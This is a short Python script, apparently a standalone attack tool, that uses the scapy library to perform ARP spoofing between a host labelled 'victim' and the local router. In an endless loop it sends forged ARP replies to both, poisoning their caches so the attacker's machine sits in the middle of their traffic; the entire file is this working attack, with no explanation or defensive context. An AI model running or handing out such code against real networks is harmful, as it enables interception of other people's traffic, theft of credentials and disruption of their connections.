from scapy.all import ARP, send
import time
import sys

def spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(packet, verbose=False)

target = "192.168.1.10"   # victim
gateway = "192.168.1.1"   # router

print("[*] Starting ARP Spoofing... Press CTRL+C to stop.")

try:
    while True:
        spoof(target, gateway)
        spoof(gateway, target)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Stopped.")
    sys.exit(0)
